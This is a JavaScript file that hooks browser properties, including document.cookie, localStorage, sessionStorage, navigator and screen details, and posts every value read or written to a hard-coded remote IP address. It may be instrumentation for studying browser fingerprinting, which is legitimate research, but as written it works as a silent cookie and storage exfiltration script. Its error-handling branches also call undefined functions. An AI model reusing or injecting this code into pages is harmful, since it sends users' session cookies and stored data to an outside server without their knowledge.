var monitorD = {
    'window' : {
        'navigator' : {
            'appCodeName' : true,
            'appName' : true,
            'appVersion' : true,
            'cookieEnabled' : true,
            'geolocation' : true,
            'language' : true,
            'languages' : true,
            'onLine' : true,
            'oscpu' : true,
            'platform' : true,
            'product' : true,
            'productSub' : true,
            'userAgent' : true,
            'vendorSub' : true,
            'vendor' : true,
            'plugins' : true
        },
        'document' : {
            'hasStorageAccess' : true,
            'requestStorageAccess' : true,
            'cookie' : true
        },
        'screen' : {
            'pixelDepth' : true,
            'colorDepth' : true,
            'height' : true,
            'width' : true
        },
        'localStorage' : true,
        'sessionStorage' : true
    }
};

Object.getPropertyDescriptor = function (subject, name) {
    var pd = Object.getOwnPropertyDescriptor(subject, name);
    var proto = Object.getPrototypeOf(subject);
    while (pd === undefined && proto !== null) {
    pd = Object.getOwnPropertyDescriptor(proto, name);
    proto = Object.getPrototypeOf(proto);
    }
    return pd;
};

function send_log(log_str) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", 'http://1.255.54.63:10921/server', true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(log_str)
}


function instrumentProperty(object, objectName,  propertyName) {
    var propDesc = Object.getPropertyDescriptor(object, propertyName);


    if(propDesc['configurable'] === true)
    {
        var originalGetter = propDesc.get;
        var originalSetter = propDesc.set;
        var originalValue = propDesc.value;

        // We overwrite both data and accessor properties as an instrumented
        // accessor property
        Object.defineProperty(object, propertyName, {
        configurable: true,
        get: (function() {
            return function() {
            var origProperty;

            // get original value
            if (originalGetter) { // if accessor property
                origProperty = originalGetter.call(this);
            } else if ('value' in propDesc) { // if data property
                origProperty = originalValue;
            } else {
                console.error("Property descriptor for",
                    objectName + '.' + propertyName,
                    "doesn't have getter or value?");
                logValue(objectName + '.' + propertyName, "",
                    "get(failed)", callContext, logSettings);
                return;
            }

            send_log(objectName + '.' + propertyName + origProperty +
                    "get");
                return origProperty;
            }
        })(),
        set: (function() {
            return function(value) {
            var returnValue;

            // set new value to original setter/location
            if (originalSetter) { // if accessor property
                returnValue = originalSetter.call(this, value);
            } else if ('value' in propDesc) { // if data property
                originalValue = value;
                returnValue = value;
            } else {
                console.error("Property descriptor for",
                    objectName + '.' + propertyName,
                    "doesn't have setter or value?");
                logValue(objectName + '.' + propertyName, value,
                    "set(failed)", callContext, logSettings);
                return value;
            }

            // log set
            send_log(objectName + '.' + propertyName + value +
                "set");
            // return new value
            return returnValue;
            }
        })()
        });
    }
    else
    {
        // TODO : implement monitoring for unconfigurable property
        // monitor(object, propertyName);
    }
}

function instrumentTree(object, base) {
    for (var key in object)
    {
        try
        {
            if (object[key] === true)
            {
                instrumentProperty(eval(base), base, key);
            }
            else if (object[key] instanceof Object) {
                instrumentTree(object[key], base + "." + key);
            }
        }
        catch (err)
        {
        }
    }
}

instrumentTree(monitorD['window'], 'window');
